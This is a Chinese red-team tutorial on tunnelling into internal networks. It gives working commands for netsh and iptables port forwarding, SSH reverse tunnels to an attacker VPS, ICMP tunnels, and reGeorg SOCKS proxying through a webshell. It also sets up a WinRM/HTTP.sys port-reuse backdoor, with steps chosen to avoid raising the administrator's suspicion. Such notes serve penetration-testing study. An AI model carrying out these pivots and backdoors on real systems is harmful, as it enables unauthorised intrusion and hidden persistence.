---
title: 【红队】构建通道漫游内网
---
# 边界代理

**遵循三个原则**

1. **稳定性**（主要用于扫描）{ 支持高并发、自动断线重连 }

2. **安全性**（防止socks5直接被ban）{ 流量可加密、开放代理可设置认证 }

3. **健壮性**   { 支持多种协议方式、最好支持插件定制 }

**推荐工具**

| 工具                                       | 优点                                                         | 缺点                              |
| ------------------------------------------ | ------------------------------------------------------------ | --------------------------------- |
| **[Frp](https://github.com/fatedier/frp)** | 稳定、支持断线重连（大流量不断线）<br/>支持将代理端口放在本地（跳板机只开个frp服务端口） | 配置复杂，体积偏大                |
| **[Nps](https://github.com/ehang-io/nps)** | 自带Web管理，一键启动<br/>**多级代理友好**                   | 稳定性不如Frp<br/>会在tmp生成文件 |

# 端口转发（打17_010等漏洞）

## Windows netsh

`netsh`仅支持TCP协议， 适用于**双网卡**服务器， 连接外网6666端口，就是连接到内网目标上面的3389。 

**启动转发**

```bash
#查看现有规则
netsh interface portproxy show all

#添加转发规则
netsh interface portproxy set v4tov4 listenaddress=外网IP listenport=6666 connectaddress=内网IP connectport=3389
```

**取消转发**

```bash
#删除转发规则
netsh interface portproxy delete v4tov4 listenport=6666

#xp需要安装ipv6
netsh interface ipv6 install
```

## Linux SSH隧道（高权限用）

SSH一般是允许通过防火墙的，而且传输过程是加密的 

> 测试环境如下图，VPS可访问Web服务器，但不能访问内网其它机器，Web服务器可访问内网其它机器。
>
> 目标：以Web服务器为跳板访问内网其它机器。

![](/images/image-20200619231457834.png)

**本地转发**

在`VPS（黑客）`上执行以下命令

```bash
ssh -CfNg -L 1153（VPS端口）:10.1.1.3（目标主机）:3389（目标端口）
root@192.168.0.3（跳板机，Web服务器，会要求输入密码）

#查看1153端口是否已经连接
netstat -tulnp | grep "1153"

#连接目标数据库服务器的远程桌面
rdesktop 127.0.0.1:1153
```

SSH进程的本地端口映射，将本地端口转发到远端指定机器的指定端口；

本地端口转发是在本地监听一个端口，所有访问这个端口的流量都会通过SSH隧道传输到远端的对应端口。

**远程转发**

 在`Web服务器`上执行如下命令 

```bash
ssh -CfNg -R 1122（VPS端口）:10.1.1.3（目标主机，数据库）:3389（目标端口） root@192.168.0.5(VPS的IP)
```

访问`VPS`的1122端口，即可连接内网数据库服务器的3389

```bash
rdesktop 127.0.0.1:1122
```

所有访问`VPS`的1122端口的流量都会通过SSH隧道传输到数据库服务器的3389端口

## ICMP隧道

项目地址：https://github.com/esrrhs/pingtunnel

适用场景 ：特殊环境下icmp流量允许出网

实现原理：客户端将TCP流量封装成icmp，然后发送给服务端，服务端再从ICMP包解析出正常TCP流量最后发向目标

![](/images/image-20200613145026593.png)

## iptables正向端口转发

1、编辑配置文件

```bash
vi /etc/sysctl.conf
	net.ipv4.ip_forward = 1#开启IP转发
```

2、关闭服务

```bash
service iptables stop
```

3、配置规则

```bash
#需要访问的内网地址：10.1.1.11（Windows）
#内网边界web服务器：192.168.100.100（Linux）
iptables -t nat -A PREROUTING --dst 192.168.100.100 -p tcp --dport 3389 -j DNAT--to-destination 10.1.1.11:3389

iptables -t nat -A POSTROUTING --dst 10.1.1.11 -p tcp --dport 3389 -j SNAT --to-source 192.168.100.100
```

4、保存并重启服务

```bash
service iptables save && service iptables start
```

这时访问Web服务器的3389就能登录到内网机器的桌面了。

# 端口复用

> **适用场景**
>
> 需要占用一些已经开启的端口情况下（  server只对外开放指定端口，无法向外进行端口转发  、规避防火墙）
>
> 当前机器不出网不出网情况下，留正向后门
>

## reGeorg 端口复用

> 网络情况：A只能连接B主机的80端口，A无法与C进行通信，且B无法与外网进行通信 

项目地址： https://github.com/sensepost/reGeorg 

reGeorg是一个Python2.7环境下开发的一款结合Webshell进行端口复用的工具；

能够将数据通过在本地建立的Socks服务转发到内网环境 ；

reGeorg需要配合Webshell使用，并且需要一个良好的网络状况，Python环境必须安装`Urlib3`

**创建Socks5代理**

```bash
python2 reGeorgSocksProxy.py -p <本地Socks5服务监听的端口> -u <Webshell地址>
python2 reGeorgSocksProxy.py -p 8888 -u http://xxx.com/shell.jsp
```

 之后使用浏览器设置Socks代理，就能访问内网主机的端口了，或者结合 Proxifier 连接 3389 

## HTTP.sys端口复用后门

>  HTTP.sys驱动是IIS的主要组成部分，主要负责HTTP协议相关的处理，它有一个重要的功能叫**Port Sharing**，即端口共享；
>
>  所有基于HTTP.sys驱动的HTTP应用可以共享同一个端口，只需要各自注册的url前缀不一样即可；
>
>  使用Windows的远程管理服务WinRM，结合HTTP.sys驱动自带的端口复用功能，可实现端口复用后门 

```bash
netsh http show servicestate	#查看所有在HTTP.sys上注册过的url前缀
```

**1、 开启WinRM服务**

WinRm使用端口：`http 5985、https 5986` 

`Server 2012`及之后，已经默认开启WinRM并监听了`5985`端口

`Server 2008`及之前的系统

```bash
winrm quickconfig -q			#开启WinRM并自动从防火墙放行`5985`端口
```

**2、 Server 2012配置，新增80端口Listerner**

对于原本就开放了WinRM的机器（Server 2012），需要保留该端口，以免影响系统管理员正常使用

同时还需要新增一个80端口的Listener供攻击者使用

```bash
winrm set winrm/config/service @{EnableCompatibilityHttpListener="true"}

winrm e winrm/config/Listener	#查看80端口的Listener是否出现
netsh http show servicestate	#查看是否新增了url前缀
```

**3、Server 2008配置，修改WinRM端口**

对于原本未开放WinRM服务的机器（Server 2008），需要把新开的**5985**端口修改至80端口，避免引起系统管理员怀疑

```bash
winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port="80"}
```

**4、后门连接**

 首先开启本机WinRM服务，然后设置信任连接的主机 

```bash
winrm quickconfig -q 	# 开启服务
winrm set winrm/config/Client @{TrustedHosts="*"}  # 设置信任连接的主机
```

 执行使用winrs命令连接远程WinRM服务，获取交互shell

```bash
winrs -r:http://www.baidu.com -u:administrator -p:P@ssw0rd cmd
```

------

端口复用相关工具： https://github.com/Heart-Sky/port-multiplexing 

# 参考连接

 [端口复用后门 - 0x4D75 - 博客园](https://www.cnblogs.com/0x4D75/p/11381449.html#%E4%B8%80-%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8) 